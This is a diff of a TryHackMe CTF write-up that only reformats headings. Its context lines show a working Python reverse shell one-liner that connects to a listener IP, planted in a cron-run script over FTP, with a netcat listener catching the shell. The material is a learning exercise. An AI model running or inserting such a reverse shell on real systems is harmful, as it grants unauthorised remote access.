@@ -3,11 +3,11 @@
 This is my write-up for the room [Basic Pentesting] (https://tryhackme.com/room/anonymous)
 
 Description: Try to get the two flags!  Root the machine and prove your understanding of the fundamentals! This is a virtual machine meant for beginners. Acquiring both flags will require some basic knowledge of Linux and privilege escalation methods.
- 
-```
-Try Hackme Difficulty: Medium
+
+## Difficulty
 My Difficulty: Easy
-```
+
+Try Hackme Difficulty: Medium
 
 <p align="center">
 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/1024px-Anonymous_emblem.svg.png" style="width:25%;">
@@ -227,7 +227,7 @@ I removed the content within the .sh and put the pentest monkey reverse shell in
 ```console
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.27.142",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
-
+# Netcat
 Now start your NC Listener on port 1234 
 
 ```console
@@ -252,7 +252,6 @@ local: clean.sh remote: clean.sh
 228 bytes sent in 0.00 secs (3.3452 MB/s)
 ftp> 
 ```
-
 We see that the NC Lister connected after about a minute of time
 
 ```console
